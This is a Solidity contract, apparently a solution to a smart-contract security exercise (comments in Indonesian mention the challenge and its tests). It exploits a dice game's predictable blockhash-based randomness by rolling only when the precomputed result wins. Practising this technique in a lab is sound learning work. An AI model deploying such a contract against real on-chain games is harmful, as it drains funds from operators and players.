// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDiceGame {
    function rollTheDice() external payable;
}

contract RiggedRoll {
    address public owner;
    IDiceGame public diceGame; // ✅ rename agar getter sesuai test
    uint256 public constant rollPrice = 0.002 ether;

    constructor(address diceAddress) {
        owner = msg.sender;
        diceGame = IDiceGame(diceAddress);
    }

    receive() external payable {}

    function riggedRoll() external {
        uint256 predicted = uint256(blockhash(block.number - 1)) % 16;

        // ✅ sesuai challenge: menang jika <= 5
        if (predicted <= 5) {
            diceGame.rollTheDice{value: rollPrice}();
        } else {
            revert("Not a winning roll");
        }
    }

    // ✅ signature sesuai test
    function withdraw(address to, uint256 amount) external {
        require(msg.sender == owner, "only owner");
        payable(to).transfer(amount);
    }
}
